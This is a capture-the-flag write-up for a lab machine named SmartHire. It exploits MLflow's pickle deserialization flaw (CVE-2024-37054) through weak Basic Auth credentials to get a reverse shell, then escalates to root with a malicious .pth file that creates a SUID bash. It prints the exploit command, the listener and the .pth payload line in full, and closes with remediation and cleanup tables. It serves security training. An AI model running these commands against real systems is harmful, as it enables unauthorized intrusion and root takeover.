
<img src="Images/smarthire%20logo.png" width="245" alt="smarthire logo">

# Attack Chain

```
account registration (smarthire.htb) → dashboard, nothing exploitable
  └─► VHOST fuzzing → models.smarthire.htb [401]
    └─► HTTP Basic Auth weak creds (admin:password) → MLflow 2.14.1
        └─► CVE-2024-37054 → overwrite python_model.pkl (malicious pickle)
            └─► prediction request → pickle.load() → __reduce__/os.system() → RCE
                └─► reverse shell as svcweb → user flag
	                └─► sudo -l → (root) NOPASSWD mlflowctl.py *
                        └─► site.addsitedir() processes .pth in plugins/dev/
	                        └─► evil.pth (import → exec) executed before main()
                                └─► SUID bash → /tmp/evilbash -p → root
```

---
# Table of contents

- [Enumeration](#enumeration)
	- [Nmap](#nmap)
	- [Web](#web)
	- [VHOST discovery - MLFLOW](#vhost-discovery---mlflow)
- [CVE-2024-37054](#cve-2024-37054)
	- [CVE explanation](#cve-explanation)
	- [CVE exploitation](#cve-exploitation)
- [Privilege Escalation](#privilege-escalation)
	- [Sudo privileges enumeration](#sudo-privileges-enumeration)
	- [Python script analysis](#python-script-analysis)
	- [Exploit the vulnerability](#exploit-the-vulnerability)
- [Remediation](#remediation)
- [Cleanup](#cleanup)

---
# Enumeration

## Nmap

Let's start by performing a port scan over the target.

```
nmap -sVC 10.129.*.* -oA scan/SmartHire                    

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 413ce3bb8870997fb89659489b859869 (ECDSA)
|_  256 d59dfd6bbed8396f3f43ab0ef63e22db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!NOTE]
> **Observations**
> - Only 2 ports open
> - Web site on port 80

We can add the entry to our `/etc/hosts` file.

```
echo '10.129.*.* smarthire.htb' | tee -a /etc/hosts 
```

## Web 

Going to the target's website reveals a classic corporate site themed around model training.

![main website - smarthire](Images/main%20website%20-%20smarthire.png)

Clicking on **Sign In** redirects us to an authentication form, with a possibility to register an account.

![login - smarthire](Images/login%20-%20smarthire.png)

Let's create an account.

![create user - smarthire](Images/create%20user%20-%20smarthire.png)

After creating a new account, we are redirected to a dashboard.

![dashboard - smarthire](Images/dashboard%20-%20smarthire.png)

But nothing could be exploited from here.

## VHOST discovery - MLFLOW

Fuzzing the target for VHOST reveals the following.

```
ffuf -fs 178 -c -w `fzf-wordlists` -H 'Host: FUZZ.smarthire.htb' -u "http://smarthire.htb/"

<SNIP>

models               [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 58ms]
```

We can add the entry to our `/etc/hosts` file.

```
echo '10.129.*.* models.smarthire.htb' | tee -a /etc/hosts 
```

Going to `http://models.smarthire.htb/` prompts us for a HTTP Basic Authentication. 
Testing weak credentials revealed that the VHOST could be accessed with the credentials `admin` and `password`.

![mlflow - smarthire](Images/mlflow%20-%20smarthire.png)

The VHOST hosts a **mlflow** application and we can see its version in the top left corner, which is `2.14.1`.

# CVE-2024-37054

That version is vulnerable to **CVE-2024-37054** and can be exploited using this [poc](https://github.com/ben-slates/CVE-2024-37054).
## CVE explanation

MLflow stores each model as a set of artifacts, including a `python_model.pkl` file that is deserialized with Python's `pickle` when the model is loaded for inference. 

Versions < 2.14.3 perform this load with no integrity check (CWE-502): any authenticated user can overwrite that artifact with a malicious pickle. 

The exploit registers a legit model to create the artifact structure, overwrites `python_model.pkl` via `PUT /api/2.0/mlflow-artifacts/artifacts/…` with a payload whose `__reduce__` returns `os.system(<reverse shell>)`, then triggers a prediction, forcing MLflow to call `pickle.load()` on the tampered artifact and execute the command.

## CVE exploitation

First we start our listener 

```
penelope -i tun0 -p 6767
```

And then we enter the following command.

```
python3 poc.py http://smarthire.htb http://models.smarthire.htb 10.10.*.* 6767 --mlflow-creds admin:password  --app-username tester --app-password tester
```
 
 `--app-username` and `--app-password` have to match the credentials for the user we created on the main website.

We should then get a connection back on our listener.

```
penelope -i tun0 -p 6767

<SNIP>

svcweb@smarthire:/var/www/smarthire.htb$
```

We can grab the user flag from here.

# Privilege Escalation

## Sudo privileges enumeration

With a foothold on the target, we can start enumerating our sudo privileges.

```
svcweb@smarthire:~$ sudo -l

<SNIP>

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

We have the right to launch a python script with sudo privileges.
## Python script analysis

The script is readable by `svcweb`, let's analyse it.

**mlflowctl.py**
```
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

The script is used to manage the MLflow service, however it is likely vulnerable because of this part:

```
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

The script adds every subfolder inside `plugins/` to `sys.path` via `site.addsitedir()`.  

`site.addsitedir()` scans the directory for `.pth` files and processes them.  

This format has a particularity: any line that starts with `import` is passed directly to `exec()`.  

The `addsitedir()` loop runs at module load, before `main()` and before argument parsing, so the payload fires regardless of the argument passed. This is also why the sudo wildcard `*` doesn't even need to be abused.

With write permission on a directory inside `plugins/`, we can craft a malicious `.pth` file and achieve arbitrary code execution in the context of the process running the script.  
Since that process runs as root in our case, this will result in privilege escalation.

## Exploit the vulnerability

First we need to check if we have write permission over a directory inside `plugins/`.

```
svcweb@smarthire:~$ ls -la /opt/tools/mlflow_ctl/plugins/
total 16
drwxr-xr-x 4 root root 4096 Feb 19  2026 .
drwxr-xr-x 3 root root 4096 Feb 19  2026 ..
drwxr-xr-x 3 root root 4096 Feb 20  2026 core
drwxrwxr-x 2 root devs 4096 Sep 22 17:50 dev
```

We notice that the group `devs` has write permission on the `dev` directory.
We can check our belonging with the command `id`.

```
svcweb@smarthire:~$ id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

`svcweb` is a member of `devs`. We can now craft our malicious `.pth` file.

```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ echo "import os; os.system('cp /bin/bash /tmp/evilbash && chmod u+s /tmp/evilbash')" > evil.pth
```

That script will copy `/bin/bash` to `/tmp` and add SUID to it.

Next we run the python script with sudo privileges.

```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 3 hours'
```

And the exploit should have worked. We can check by looking at the files inside `/tmp`.

```
svcweb@smarthire:/tmp$ ls
evilbash
```

We can now get a shell with `root` privileges.

```
svcweb@smarthire:/tmp$ ./evilbash -p
evilbash-5.1# id

uid=1000(svcweb) gid=1000(svcweb) euid=0(root) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

> [!TIP]
> **Machine Rooted**


# Remediation

| # | Finding | Root Cause | Remediation |
|---|---------|-----------|-------------|
| 1 | MLflow unsafe pickle deserialization (CVE-2024-37054) — Critical | Model artifacts deserialized via `pickle` on load, no integrity check (CWE-502) | Upgrade MLflow ≥ 2.14.3; sign/verify artifacts; prefer non-executable formats (`safetensors`) |
| 2 | MLflow VHOST weak credentials — High | Basic Auth with default creds `admin:password` (CWE-521) | Rotate to strong unique creds; restrict MLflow API to internal network; add auth rate limiting |
| 3 | Privesc via `.pth` in writable plugin dir — High | `addsitedir()` runs on every `plugins/` subdir and executes `.pth` files; `dev/` group-writable + `NOPASSWD` sudo (CWE-426 / CWE-732) | Remove/scope the sudo rule (no wildcard `*`); make `plugins/` root-owned & non-writable; load an explicit module allowlist instead of `addsitedir()` |

# Cleanup

| Location | Artifact | Action |
|----------|----------|--------|
| `/tmp/evilbash` | SUID bash copy | `rm -f /tmp/evilbash` |
| `/opt/tools/mlflow_ctl/plugins/dev/evil.pth` | Malicious `.pth` payload | `rm -f …/evil.pth` |
| MLflow server | Tampered run + overwritten `python_model.pkl` | Delete the run/artifact, retrain from clean source |
